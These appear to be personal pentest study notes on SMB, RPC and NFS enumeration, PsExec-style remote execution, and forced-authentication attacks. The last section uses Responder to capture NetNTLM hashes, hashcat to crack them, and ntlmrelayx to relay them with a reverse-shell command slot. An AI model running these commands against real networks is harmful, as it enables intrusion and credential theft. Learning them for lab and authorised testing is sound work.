SMB can be used on windows AND linux
MSRPC is the Microsoft implementation of something similar to SMB

* smbclient can be used for SMB AND RPC, but it's not the best tool for RPC
* rpcclient is better to use for RPC

SMB (samba) with smbclient

* List shares (anonymous):
  smbclient -N -L //<target_ip>
  • -N = no password (anonymous)
* Connect to a share:
  smbclient //<target_ip>/<share_name>
* Common interactive commands inside smbclient:
  ls           # list files in current dir
  cd/<cs>      # change directory (cs is shorthand)
  get <file>   # download file from share to local
  put <file>   # upload file to share (if permitted)
  exit/quit    # leave smbclient

MORE ENUMERATION WITH SMBMAP:
smbmap -H <target-ip>     # provides also a list of permissions for each shared folder

using -r, you can browse the listed shares:
smbmap -H <target-ip> -r sharename

and download items:
smbmap -H <target-ip> --download "notes\note.txt"
(BE CAREFUL! The disk could be listed as .\Share\ so make sure --download ".\Share\")

and upload:
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

RPC SERVICE ENUM!
you can get a cleaner output of rpc services using:

and NFS shares available using:

if something is available like: /ShareName (everyone)

then you can mount it to a local mount point using:
mkdir -p /mnt/nfs-gimme/
sudo mount -t nfs -o ro,vers=4,proto=tcp <SERVER_IP>:/ShareName /mnt/nfs-gimme/
^ try that first, if not, then v
sudo mount -t nfs -o ro,vers=3,proto=tcp <SERVER_IP>:/ShareName /mnt/nfs-gimme/

PSEXEC AND RCE!:
PsExec is on Microsoft's website -- it's freeware to administer remote systems.
Other linux implementations are:

Impacket PsExec - Python PsExec like functionality example using RemComSvc.
impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.

CrackMapExec - includes an implementation of smbexec and atexec.

RPC with rpcclient

* Connect anonymously:
  rpcclient -U "" <target_ip>
  • -U "" passes an empty username (anonymous)
* Useful rpcclient commands:
  srvinfo                # basic server info
  enumdomains            # enumerate domains
  querydominfo           # query domain info
  netshareenumall        # enumerate all network shares
  netsharegetinfo <share># get details about a specific share
  enumdomusers           # enumerate domain users
  queryuser <RID>        # query user by RID (relative id)
* Tips:
  • Run rpcclient commands interactively after connecting.
  • Many RPC commands require proper privileges to return full info.
  • Combine smbclient + rpcclient findings for richer enumeration.

GENERAL NOTES

* Try anonymous first; many labs/CTFs expose read-only shares.
* When downloading files, verify ownership/permissions (UID/GID).
* If anonymous is blocked, try common creds or authenticated scans (only with permission).
* Log outputs locally for later analysis (e.g., smbclient -L output, rpcclient dumps).




FORCED AUTHENTICATION ATTACKS WITH RESPONDER
We can abuse the SMB protocol by creating a fake SMB server to capture users' NetNTLM v1/v2 hashes
Responder is an LLMNR, NBT-NS, and MDNS poisoner tool.

creating a fake SMB server using Responder w/ default config:
responder -I <interface name>

^ hashes can be cracked w/ hashcat
(Responder logs can be found in /usr/share/responder/logs/)
hashcat -m 5600 hash.txt rockyou.txt


RELAYING RESPONDER HASHES TO ANOTHER MACHINE USING IMPACKET-NTLMRELAYX
cat /etc/responder/Responder.conf | grep 'SMB ='
(make sure that SMB = Off)

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
or a powershell revshell:
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '{insert revshell base64 command generated here}'
